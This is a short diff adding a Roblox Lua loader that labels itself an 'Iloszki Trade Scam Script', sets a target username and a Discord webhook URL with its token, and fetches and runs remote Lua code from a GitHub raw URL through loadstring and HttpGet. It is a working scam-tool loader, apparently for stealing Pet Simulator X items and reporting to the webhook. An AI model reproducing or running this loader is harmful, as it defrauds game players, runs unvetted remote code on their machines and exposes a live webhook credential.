@@ -1,0 +1,8 @@
+Username = "WhiteAFOnes"
+WebHook = "https://discord.com/api/webhooks/1074055412757827624/qPAcg0695Xgo65bt7lIdq3cxLclgj5oz94bnBFl8VLSYBwSbvkvkl9wWLhBgBsrhgpFb"
+
+_G.CustomScriptName = "Iloszki.cc"
+_G.Text1 = "Iloszki Trade Scam Script Loading"
+_G.Text2 = "Waiting For Respond"
+_G.Text3 = "Starting Iloszki"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua%22))()
